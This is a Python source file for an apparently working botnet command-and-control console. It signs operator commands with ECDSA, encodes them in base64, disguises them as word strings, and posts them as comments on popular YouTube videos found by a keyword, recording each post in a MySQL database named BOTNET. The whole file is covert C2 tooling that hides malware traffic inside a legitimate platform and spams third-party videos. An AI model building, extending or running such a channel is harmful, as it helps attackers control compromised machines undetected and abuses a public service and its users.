import cmd
import base64
import YoutubeHandler
import json
import random
from youtubesearchpython import *
from youtube_comment_downloader import *
import ecdsa
import time
import mysql.connector
import pandas as pd
import os
from ecdsa import SigningKey, VerifyingKey, NIST256p



class Shell(cmd.Cmd):
    def __init__(self, contact_word):
        super().__init__()
        self.prompt = f'[{contact_word}] > '
        self.youtube = None
        self.message = None
        self.encoded_message = None
        self.current_message_time = None
        self.signature = None
        self.to_send = None
        self.contact_word = contact_word
        self.commands_word = None
        self.contact_video = None
        self.contact_video_comments_id = None
        self.private_key = None
        self.public_key = None
        self.mydb = mysql.connector.connect( # Change database credentials here!!
            host="localhost",
            user="root",
            database="BOTNET",
            password=""
        )
        self.mycursor = self.mydb.cursor()
        self.youtube_downloader = YoutubeCommentDownloader()
        try:
            f = open("b64_to_words.json", "r")
            self.b64_dict = json.load(f)
        except:
            print("Couldn't load b64_to_words.json! Exiting...")
            exit()
        try:
            self.import_keys()
        except:
            print("Couldn't import the public or the private keys! Exiting...")
            exit()

    # Import the public and the respective private key files that sign the messages
    def import_keys(self):
        # Load the private key from a PEM file
        with open("private_key.pem", "r") as f:
            self.private_key = ecdsa.SigningKey.from_pem(f.read())

        with open("public_key.pem", "r") as f:
            self.public_key = ecdsa.VerifyingKey.from_pem(f.read())

    # Connect to YouTube data API
    def do_connect(self, args):
        try:
            self.youtube = YoutubeHandler.YouTubeHandler()
        except:
            print("Couldn't connect to YouTube, please try again later...")
            self.youtube = None

    # Find videos with a set keyword or a contact word
    def find_videos(self):
        word = self.contact_word if self.commands_word is None else self.commands_word
        counters = dict()
        for _ in range(10):
            # fetch videos
            videos = VideosSearch(word, limit=50).result()

            # filter videos that have sufficient amount of time
            videos = list(filter(lambda x: (not x['publishedTime'] is None) and ('month' in x['publishedTime'] or 'week' in x['publishedTime']), videos['result']))
            videos = list(
                filter(lambda x: (not x['viewCount']['text'] is None) and (200000 <= int(x['viewCount']['text'].split(' ')[0].replace(',', '')) <= 2000000), videos))

            videos_ids = [video['id'] for video in videos]

            for video_id in videos_ids:
                if video_id not in counters:
                    counters[video_id] = 1
                else:
                    counters[video_id] += 1

        counters = {key: counters[key] for key in counters if counters[key] >= 5}
        self.contact_video = sorted(counters, reverse=True)

    # Encode the messages before sending them to YouTube
    def update_msg(self, msg):
        self.message = msg
        encoded_message = base64.b64encode(msg.encode()).decode()
        self.current_message_time = int(time.time())
        encoded_time_stamp = base64.b64encode(str(self.current_message_time).encode()).decode()
        full_message_to_sign = encoded_message + '$' + encoded_time_stamp
        self.signature = self.private_key.sign(full_message_to_sign.encode())
        final_message = full_message_to_sign + '$' + base64.b64encode(self.signature).decode()
        self.to_send = ''
        for char in final_message:
            random_number = random.randint(0, len(self.b64_dict[char]) - 1)
            self.to_send += self.b64_dict[char][random_number] + ' '
        if self.to_send:
            self.to_send = self.to_send[:-1]

    # Find if a message has been posted on a video
    def search_video_for_contact_comment(self, video_id, msg):
        comments = self.youtube_downloader.get_comments_from_url(f'https://www.youtube.com/watch?v={video_id}', sort_by=SORT_BY_RECENT)
        for comment in comments:
            if comment['text'] == msg:
                return True
        return False

    # Set new keyword to find videos
    def do_set_word(self, args):
        self.commands_word = args
        self.prompt = f'[{args}] > '

    # Reset keyword to the contact word
    def do_reset_word(self, args):
        self.commands_word = None
        self.prompt = f'[{self.contact_word}] > '

    # Send a comment to YouTube by the corrently defined word
    def do_send(self, args):
        if self.youtube is None:
            print("You must connect first!!!")
            return
        print("Searching for videos with the word:", self.contact_word if self.commands_word is None else self.commands_word)
        self.update_msg(args)
        self.find_videos()
        while self.contact_video:
            print(f'Trying video https://www.youtube.com/watch?v={self.contact_video[0]}')
            try:
                self.contact_video_comments_id = self.youtube.post_comment(self.contact_video[0], self.to_send)
            except:
                self.contact_video.pop(0)
                continue
            if self.search_video_for_contact_comment(self.contact_video[0], self.to_send):
                sql = 'insert into comments (keyword, video_id, comment_id, comment) values (%s, %s, %s, %s);'
                values = (self.contact_word if self.commands_word is None else self.commands_word, self.contact_video[0], self.contact_video_comments_id, args)
                self.mycursor.execute(sql, values)
                self.mydb.commit()
                print(f'Posted comment on https://www.youtube.com/watch?v={self.contact_video[0]}')
                break
            self.youtube.delete_comment(self.contact_video_comments_id)
            self.contact_video.pop(0)
    
    # List all comments in the database
    def do_show_comments(self, args):
        self.mycursor.execute("SELECT * FROM comments")
        myresult = self.mycursor.fetchall()
        print(pd.DataFrame(myresult, columns=['id', 'keyword', 'video_id', 'comment_id', 'comment', 'creation_time']))


    # Delete comment by id in the database
    def do_del_comment(self, args):
        if self.youtube is None:
            print("You must connect first!!!")
            return
        self.mycursor.execute("SELECT comment_id FROM comments where id = %s", (args, ))
        myresult = self.mycursor.fetchall()
        self.youtube.delete_comment(myresult[0][0])
        self.mycursor.execute("DELETE FROM comments WHERE id = %s", (args, ))
        self.mydb.commit()

    # Exit the shell
    def do_exit(self, args):
        return True

    # Define an empty method for handling unknown commands
    def default(self, line):
        print("I'm sorry, I don't know how to do that.")
 

def generate_key_pair():
    private_key = ecdsa.SigningKey.generate(curve=ecdsa.SECP256k1)
    public_key = private_key.get_verifying_key()
    with open("private_key.pem", "wb") as f:
        f.write(private_key.to_pem())
    with open("public_key.pem", "wb") as f:
        f.write(public_key.to_pem())


def are_keys_matching(private_key_file, public_key_file):
    if not os.path.exists(private_key_file) or not os.path.exists(public_key_file):
        return False

    with open(private_key_file, 'rb') as private_key_file:
        private_key_data = private_key_file.read()
        private_key = SigningKey.from_pem(private_key_data)

    with open(public_key_file, 'rb') as public_key_file:
        public_key_data = public_key_file.read()
        public_key = VerifyingKey.from_pem(public_key_data)

    message = b'This is a test message to check key matching.'
    signature = private_key.sign(message)

    try:
        public_key.verify(signature, message)
        return True
    except:
        return False


# Create an instance of the Shell class and run the interactive loop
if __name__ == "__main__":
    try:
        if not are_keys_matching("private_key.pem", "public_key.pem"):
            generate_key_pair()
    except:
        print("Couldn't find or generate private and public keys")
        exit()
    Shell('batman').cmdloop()
